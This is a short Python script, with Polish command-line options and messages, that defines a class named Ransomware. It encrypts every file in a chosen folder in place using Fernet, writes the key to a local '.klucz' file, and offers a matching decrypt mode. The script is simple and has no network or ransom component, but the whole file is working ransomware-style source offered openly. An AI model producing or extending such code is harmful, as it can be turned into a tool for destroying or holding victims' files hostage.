import argparse
import os

from cryptography.fernet import Fernet


class Ransomware:
    def __init__(self):
        self.args = self.parse_args()

    def parse_args(self):
        parser = argparse.ArgumentParser()

        action_parser = parser.add_mutually_exclusive_group(required=True)
        action_parser.add_argument('-z', "--zakoduj", action="store_true", help="zakoduj pliki")
        action_parser.add_argument('-o', "--odkoduj", action="store_true", help="odkoduj pliki")

        parser.add_argument('-f', "--folder", required=True, type=str, help="sciezka do folderu z plikami")

        return parser.parse_args()

    def encrypt_files(self, directory_with_files: str):
        key = Fernet.generate_key()
        cipher = Fernet(key)

        with open(".klucz", "wb") as key_file:
            key_file.write(key)

        for filename in os.listdir(directory_with_files):
            filepath = os.path.join(directory_with_files, filename)
            if os.path.isfile(filepath):
                with open(filepath, "rb") as data_file:
                    data = data_file.read()
                encrypted_data = cipher.encrypt(data)
                with open(filepath, "wb") as encrypted_file:
                    encrypted_file.write(encrypted_data)

        print("Pliki zostaly zaszyfrowane")

    def decrypt_files(self, directory_with_files: str):
        with open(".klucz", "rb") as key_file:
            key = key_file.read()
        cipher = Fernet(key)

        for filename in os.listdir(directory_with_files):
            filepath = os.path.join(directory_with_files, filename)
            if os.path.isfile(filepath):
                with open(filepath, "rb") as encrypted_file:
                    encrypted_data = encrypted_file.read()
                decrypted_data = cipher.decrypt(encrypted_data)
                with open(filepath, "wb") as decrypted_file:
                    decrypted_file.write(decrypted_data)

        print("Pliki zostaly odszyfrowane")

    def run(self):
        if self.args.zakoduj:
            self.encrypt_files(self.args.folder)
        elif self.args.odkoduj:
            self.decrypt_files(self.args.folder)

if __name__ == "__main__":
    ransomware = Ransomware()
    ransomware.run()